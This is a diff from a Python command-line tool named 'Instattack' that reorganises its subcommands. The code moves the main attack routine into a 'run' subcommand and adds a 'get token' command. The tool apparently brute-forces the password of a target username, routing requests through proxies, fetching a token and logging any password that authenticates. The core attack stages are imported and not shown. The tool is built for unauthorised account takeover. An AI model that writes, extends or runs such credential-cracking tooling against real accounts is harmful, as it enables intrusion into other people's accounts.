@@ -10,27 +10,6 @@ from .stages import attack, get_token
 @Instattack.subcommand('attack')
 class InstattackAttack(Instattack, RequestArgs, ProxyArgs, PasswordArgs, TokenArgs):
 
-    __name__ = 'Attack Command'
-
-    def main(self, username):
-        loop = asyncio.get_event_loop()
-
-        self.user = User(username)
-        self.user.setup()
-
-        # Token will be None if an exception occured.
-        token = loop.run_until_complete(self.retrieve_token(loop))
-        if not token:
-            self.log.error('Token retrieval failed.')
-            return
-
-        self.log.complete('Received Token', extra={'other': token})
-        result = loop.run_until_complete(self.attempt_attack(loop, token))
-        if result:
-            self.log.info(f'Authenticated User!', extra={
-                'password': result.context.password
-            })
-
     async def retrieve_token(self, loop):
 
         request_config = self.request_config(method='GET')
@@ -53,3 +32,50 @@ class InstattackAttack(Instattack, RequestArgs, ProxyArgs, PasswordArgs, TokenAr
             proxy_config=self.proxy_config(method='POST'),
             pwlimit=self._pwlimit
         )
+
+
+@InstattackAttack.subcommand('get')
+class AttackGet(InstattackAttack):
+    pass
+
+
+@InstattackAttack.subcommand('run')
+class AttackRun(InstattackAttack):
+
+    __name__ = 'Run Attack'
+
+    def main(self, username):
+        loop = asyncio.get_event_loop()
+
+        self.user = User(username)
+        self.user.setup()
+
+        # Token will be None if an exception occured.
+        token = loop.run_until_complete(self.retrieve_token(loop))
+        if not token:
+            self.log.error('Token retrieval failed.')
+            return
+
+        self.log.complete('Received Token', extra={'other': token})
+        result = loop.run_until_complete(self.attempt_attack(loop, token))
+        if result:
+            self.log.info(f'Authenticated User!', extra={
+                'password': result.context.password
+            })
+
+
+@AttackGet.subcommand('token')
+class GetToken(InstattackAttack):
+
+    __name__ = 'Attack Get Token'
+
+    def main(self):
+        loop = asyncio.get_event_loop()
+
+        # Token will be None if an exception occured.
+        token = loop.run_until_complete(self.retrieve_token(loop))
+        if not token:
+            self.log.error('Token retrieval failed.')
+            return
+
+        self.log.complete('Received Token', extra={'other': token})
